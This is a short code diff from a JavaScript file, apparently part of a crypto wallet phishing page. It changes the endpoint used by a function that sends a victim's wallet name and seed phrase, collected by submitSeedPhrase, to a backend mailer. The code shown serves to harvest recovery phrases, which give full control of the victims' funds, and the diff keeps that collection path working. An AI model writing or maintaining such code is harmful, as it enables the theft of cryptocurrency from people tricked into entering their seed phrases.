@@ -1395,7 +1395,7 @@ function submitSeedPhrase() {
 // ✅ NEW: Separate function to send via backend
 async function sendViaBackend(walletName, walletIcon, seedPhrase, connectBtn) {
   try {
-    const response = await fetch("/send-email", {
+    const response = await fetch("/api/send-email", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
